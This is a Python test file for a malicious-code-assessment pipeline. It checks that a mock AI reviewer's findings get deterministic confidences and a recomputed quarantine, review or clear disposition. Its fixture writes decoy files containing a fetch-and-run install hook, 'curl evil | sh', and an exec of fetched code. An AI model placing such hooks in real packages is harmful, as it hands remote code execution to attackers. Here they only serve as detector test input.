"""The mcd goalpack: the brain finds AND adjudicates in the loop; the renderer
deterministically sets confidences and recomputes the disposition.

Proves the mcd migration end-to-end on the goalpack model:

- a scripted :class:`MockAdapter` emits ``FINDING: [sev:.. conf:.. verdict:.. tier:..]
  <title> :: <evidence>`` lines covering every verdict
  (confirm / escalate / deescalate / refute / suppress) then ``DONE``;
- ``run_goalpack(load_goalpack("mcd"), ...)`` drives the loop over a temp-``$REKIT_HOME``
  project and returns a :class:`GoalpackResult` whose ``.report`` is the mcd assessment
  shape, and lands a ``report/json`` artifact in the ledger;
- the **deterministic rule** holds: refute caps reviewed confidence at 0.1 and is
  dropped from the disposition input (but stays in the findings, flagged); suppress ->
  0; escalate raises; **severity is unchanged** from what the brain stated; the
  disposition is **recomputed** (not model-set).

Plain-python style (runnable via ``python tests/test_goalpack_mcd.py``) and
pytest-compatible. A temp ``$REKIT_HOME`` keeps everything hermetic — no network.
"""

import contextlib
import json
import os
import sys
import tempfile
from pathlib import Path

HERE = os.path.dirname(__file__)
sys.path.insert(0, os.path.abspath(os.path.join(HERE, "..")))

from rekit.goalpacks import (  # noqa: E402
    GoalpackResult,
    load_goalpack,
    run_goalpack,
)
from rekit.harness import MockAdapter, MockTurn  # noqa: E402
from rekit.ledger import open_project  # noqa: E402


@contextlib.contextmanager
def temp_home():
    """A temp ``REKIT_HOME`` (restored afterwards) + a temp workspace. Yields
    ``(home_path, work_path)``."""
    saved = os.environ.get("REKIT_HOME")
    with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as work:
        os.environ["REKIT_HOME"] = home
        try:
            yield Path(home), Path(work)
        finally:
            if saved is None:
                os.environ.pop("REKIT_HOME", None)
            else:
                os.environ["REKIT_HOME"] = saved


def _make_target(work: Path) -> Path:
    """A small suspicious-looking target tree to open a project against."""
    target = work / "pkg"
    target.mkdir()
    (target / "setup.py").write_text("import os\nos.system('curl evil | sh')\n", encoding="utf-8")
    (target / "loader.py").write_text("exec(fetch('http://x'))\n", encoding="utf-8")
    return target


#: A script covering all five verdicts, plus one escalate with a proven path.
def _mcd_script():
    return [
        MockTurn(
            text=(
                "Read the package.\n"
                # high severity, confirm -> reviewed confidence stays 0.8 (>= 0.65 -> quarantine)
                "FINDING: [sev:high conf:0.8 verdict:confirm tier:3] Install hook execs remote payload "
                ":: setup.py runs curl|sh at install time\n"
                # escalate WITHOUT proven path -> min(0.6+0.2, 0.95) = 0.8
                "FINDING: [sev:medium conf:0.6 verdict:escalate tier:3] Suspicious decode step "
                ":: base64 blob decoded then run\n"
            )
        ),
        MockTurn(
            text=(
                # escalate WITH proven path -> 0.9
                "FINDING: [sev:high conf:0.5 verdict:escalate tier:4 path:proven] Dropper writes+runs code "
                ":: traced fetch() into exec() at loader.py:1\n"
                # deescalate -> 0.7 * 0.6 = 0.42
                "FINDING: [sev:medium conf:0.7 verdict:deescalate tier:2] Cred read near network call "
                ":: value never flows into the request\n"
                # refute -> min(0.9, 0.1) = 0.1, dropped from disposition
                "FINDING: [sev:high conf:0.9 verdict:refute tier:0] Obfuscated exec flagged "
                ":: decoded blob is a PNG icon, benign\n"
                # suppress -> 0.0, dropped from disposition
                "FINDING: [sev:low conf:0.4 verdict:suppress tier:0] eval in test fixture "
                ":: rule noise; test data never imported\n"
                "DONE\n"
            )
        ),
    ]


def _by_title(findings, needle):
    for f in findings:
        if needle in (f.get("title") or ""):
            return f
    raise AssertionError(f"no finding titled ~{needle!r} in {[f.get('title') for f in findings]}")


def test_load_mcd_resolves_renderer_and_capabilities():
    """``load_goalpack('mcd')`` resolves the renderer callable and carries the goal
    + the unpack/decompile capabilities so packed/binary malware can be revealed."""
    with temp_home():
        gp = load_goalpack("mcd")
        assert gp.name == "mcd"
        assert callable(gp.renderer), "renderer should resolve to a callable"
        assert callable(gp.render_markdown), "render_markdown companion should resolve"
        assert "malicious" in gp.goal.lower()
        assert "unpack" in gp.requested_capabilities
        assert "decompile" in gp.requested_capabilities
        assert gp.system_prompt.strip(), "system-prompt.md should be loaded"


def test_run_mcd_adjudicates_and_recomputes_disposition():
    """End-to-end: the brain finds + adjudicates; the renderer sets confidences by
    the ported rule and recomputes the disposition; the report is a ledger artifact."""
    with temp_home() as (_home, work):
        target = _make_target(work)
        project = open_project(str(target))
        gp = load_goalpack("mcd")
        assert gp.renderer is not None

        adapter = MockAdapter(_mcd_script())
        result = run_goalpack(project, gp, adapter, max_rounds=8)

        assert isinstance(result, GoalpackResult)
        report = result.report
        assert report is not None

        # -- the mcd assessment shape ------------------------------------------
        assert set(report.keys()) >= {"summary", "findings", "disposition"}
        summary = report["summary"]
        assert set(summary.keys()) == {"findingCount", "highestSeverity", "disposition"}
        assert summary["findingCount"] == 6, summary
        findings = report["findings"]
        assert len(findings) == 6

        # The loop received the goalpack's own system prompt, not the goal string.
        assert adapter.calls[0].system_prompt == gp.system_prompt

        # -- the deterministic confidence rule ---------------------------------
        confirm = _by_title(findings, "Install hook")
        assert confirm["verdict"] == "confirm"
        assert confirm["reviewedConfidence"] == 0.8, "confirm keeps the stated confidence"
        assert confirm["engineConfidence"] == 0.8, "brain-stated confidence retained (diffable)"

        esc_unproven = _by_title(findings, "Suspicious decode")
        assert esc_unproven["verdict"] == "escalate"
        assert esc_unproven["reviewedConfidence"] == 0.8, "escalate (no path) -> min(0.6+0.2, 0.95)"

        esc_proven = _by_title(findings, "Dropper")
        assert esc_proven["verdict"] == "escalate"
        assert esc_proven["reviewedConfidence"] == 0.9, "escalate (path proven) -> 0.9"
        assert esc_proven["pathProven"] is True

        deesc = _by_title(findings, "Cred read")
        assert deesc["verdict"] == "deescalate"
        assert deesc["reviewedConfidence"] == 0.42, "deescalate -> 0.7 * 0.6"

        refute = _by_title(findings, "Obfuscated exec")
        assert refute["verdict"] == "refute"
        assert refute["reviewedConfidence"] == 0.1, "refute caps at 0.1"
        assert refute["excludedFromDisposition"] is True, "refute is dropped from disposition input"
        # ...but still PRESENT in the findings (kept-but-flagged, not deleted).
        assert refute in findings

        suppress = _by_title(findings, "eval in test fixture")
        assert suppress["verdict"] == "suppress"
        assert suppress["reviewedConfidence"] == 0.0, "suppress -> 0"
        assert suppress["excludedFromDisposition"] is True

        # -- severity is NEVER changed from what the brain stated --------------
        assert confirm["severity"] == "high"
        assert esc_unproven["severity"] == "medium"
        assert deesc["severity"] == "medium"
        assert refute["severity"] == "high"       # refuted stays high-severity, only conf capped
        assert suppress["severity"] == "low"

        # -- the disposition is RECOMPUTED (not model-set) --------------------
        disposition = report["disposition"]
        # confirm (high, 0.8) and esc_proven (high, 0.9) survive at >= 0.65 -> quarantine.
        assert disposition["recommendation"] == "quarantine", disposition
        assert summary["disposition"] == "quarantine"
        assert disposition.get("drivers"), "quarantine names its drivers"
        assert "0.65" in disposition["thresholds"]
        # highest severity across ALL findings (refuted high still counts for severity).
        assert summary["highestSeverity"] == "high"

        # -- report is a first-class ledger artifact: report/json -------------
        kinds = {a.kind for a in result.report_artifacts}
        assert "report/json" in kinds, kinds
        for art in result.report_artifacts:
            assert art.meta.get("goalpack") == "mcd"
            assert art.meta.get("findingCount") == 6
        ledger = project.reload()
        for art in result.report_artifacts:
            assert ledger.has_artifact(art.content_hash), "report should be in the ledger"

        # report.json exists on disk under the project and holds the structured data.
        json_path = project.dir / "reports" / "mcd" / "report.json"
        assert json_path.is_file(), "report.json should be written under the project"
        on_disk = json.loads(json_path.read_text(encoding="utf-8"))
        assert on_disk["summary"]["disposition"] == "quarantine"

        # The findings are durable in the ledger — the generic substrate rendered from.
        assert len(ledger.findings()) == 6


def test_disposition_downgrades_when_high_findings_are_refuted():
    """The recompute is real: refute/suppress the only high-confidence highs and the
    disposition drops from quarantine to review — proving it is not model-set."""
    with temp_home() as (_home, work):
        target = _make_target(work)
        project = open_project(str(target))
        gp = load_goalpack("mcd")

        script = [
            MockTurn(
                text=(
                    # a high-severity finding the brain then REFUTES -> excluded
                    "FINDING: [sev:high conf:0.9 verdict:refute tier:0] Looks like a dropper "
                    ":: on reading it is a benign updater\n"
                    # a surviving MEDIUM finding keeps a finding present but below the high bar
                    "FINDING: [sev:medium conf:0.6 verdict:confirm tier:2] Reads env vars "
                    ":: harmless config read\n"
                    "DONE\n"
                )
            )
        ]
        result = run_goalpack(project, gp, MockAdapter(script), max_rounds=4)
        report = result.report

        # No surviving high/critical at >= 0.65 -> not quarantine; a finding survives -> review.
        assert report["disposition"]["recommendation"] == "review", report["disposition"]
        assert report["summary"]["disposition"] == "review"
        # The refuted high is still in the findings and still marked high severity.
        refuted = _by_title(report["findings"], "Looks like a dropper")
        assert refuted["severity"] == "high"
        assert refuted["excludedFromDisposition"] is True
        # Severity rollup still reflects the (excluded-from-disposition) high finding.
        assert report["summary"]["highestSeverity"] == "high"


def test_all_findings_excluded_yields_clear():
    """If every finding is refuted/suppressed, nothing survives to the disposition
    input -> clear (recomputed over an empty surviving set)."""
    with temp_home() as (_home, work):
        target = _make_target(work)
        project = open_project(str(target))
        gp = load_goalpack("mcd")

        script = [
            MockTurn(
                text=(
                    "FINDING: [sev:high conf:0.9 verdict:refute tier:0] False alarm A :: benign\n"
                    "FINDING: [sev:medium conf:0.5 verdict:suppress tier:0] Rule noise B :: test data\n"
                    "DONE\n"
                )
            )
        ]
        result = run_goalpack(project, gp, MockAdapter(script), max_rounds=4)
        report = result.report

        assert report["disposition"]["recommendation"] == "clear", report["disposition"]
        assert report["summary"]["findingCount"] == 2, "flagged findings stay in the report"
        assert all(f["excludedFromDisposition"] for f in report["findings"])


def test_markdown_companion_is_readable():
    """The markdown companion renders a summary line, findings by severity with
    verdict + reviewed confidence, and the disposition + rule note."""
    with temp_home() as (_home, work):
        target = _make_target(work)
        project = open_project(str(target))
        gp = load_goalpack("mcd")

        result = run_goalpack(project, gp, MockAdapter(_mcd_script()), max_rounds=8)

        # markdown is persisted as a report/markdown artifact.
        kinds = {a.kind for a in result.report_artifacts}
        assert kinds == {"report/json", "report/markdown"}, kinds
        md = gp.render_markdown(result.report)
        assert "# Malicious-code assessment" in md
        assert "QUARANTINE" in md
        assert "## High" in md
        assert "confirm" in md and "escalate" in md
        assert "dropped from disposition" in md, "refuted/suppressed flagged in the readout"
        # the rule note is carried into the readout.
        assert "reviewer classifies" in md


if __name__ == "__main__":
    test_load_mcd_resolves_renderer_and_capabilities()
    test_run_mcd_adjudicates_and_recomputes_disposition()
    test_disposition_downgrades_when_high_findings_are_refuted()
    test_all_findings_excluded_yields_clear()
    test_markdown_companion_is_readable()
    print("rekit mcd goalpack tests passed")
